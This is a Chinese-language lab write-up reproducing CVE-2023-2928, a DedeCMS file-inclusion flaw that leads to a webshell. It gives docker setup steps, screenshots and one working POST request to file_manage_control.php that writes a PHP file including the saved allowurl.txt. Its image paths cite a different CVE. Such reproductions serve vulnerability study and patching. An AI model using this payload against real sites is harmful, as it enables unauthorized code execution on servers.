# CVE-2023-2928 DedeCMS 文件包含漏洞getshell 

DedeCMS（也称为织梦CMS）是一款基于PHP+MySQL的开源内容管理系统。

在 DedeCMS 5.7.106 及之前的版本中发现一个漏洞。它已被宣布为关键。受此漏洞影响的是未知功能的文件uploads/dede/article_allowurl_edit.php。对参数 allurls 的操作会导致代码注入。攻击可以远程发起。

官网地址https://www.dedecms.com/

参考链接：

- https://blog.csdn.net/shelter1234567/article/details/137467939
- https://nvd.nist.gov/vuln/detail/CVE-2023-2928



## 漏洞环境



执行如下命令启动一个DedeCms-v5.7.112-web服务器：

```
docker compose up 
```

服务启动后，可访问`http://your-ip:80/`跳转到DedeCms安装向导页面

![](https://github.com/Shelter1234/VulneraLab/raw/main/DedeCMS/CVE-2024-3148/1.png)

点击继续安装

[![image-20240407141203597](https://github.com/Shelter1234/VulneraLab/raw/main/DedeCMS/CVE-2024-3148/2.png)](https://github.com/Shelter1234/VulneraLab/blob/main/DedeCMS/CVE-2024-3148/2.png)

安装完成

[![image-20240407141314706](https://github.com/Shelter1234/VulneraLab/raw/main/DedeCMS/CVE-2024-3148/3.png)](https://github.com/Shelter1234/VulneraLab/blob/main/DedeCMS/CVE-2024-3148/3.png)

## 漏洞复现

使用账号密码登录网站后台,获取后台cookie

[![image-20240407141455435](https://github.com/Shelter1234/VulneraLab/raw/main/DedeCMS/CVE-2024-3148/4.png)](https://github.com/Shelter1234/VulneraLab/blob/main/DedeCMS/CVE-2024-3148/4.png)

访问article_allowurl_edit.php页面 保存超链接

![](https://img-blog.csdnimg.cn/direct/e27cfa8a262e4738a282a6c9d6857492.png)

访问file_manage_control.php 利用文件包含构造1.php

![img](https://img-blog.csdnimg.cn/direct/1f5b1019f1dc437cb49e1aef0b194230.png)

```
POST /dede/file_manage_control.php HTTP/1.1

fmdo=edit&backurl=&token=&activepath=&filename=1.php&str=<?php Include_once("./data/admin/allowurl.txt"); ?>&B1=++%E4%BF%9D+%E5%AD%98++
```

![](https://img-blog.csdnimg.cn/direct/4a95fbf013b2490fb17225d8d07d8263.png)

访问1.php

![](https://img-blog.csdnimg.cn/direct/d4443bff0b1f411aa725656f9c83fe57.png)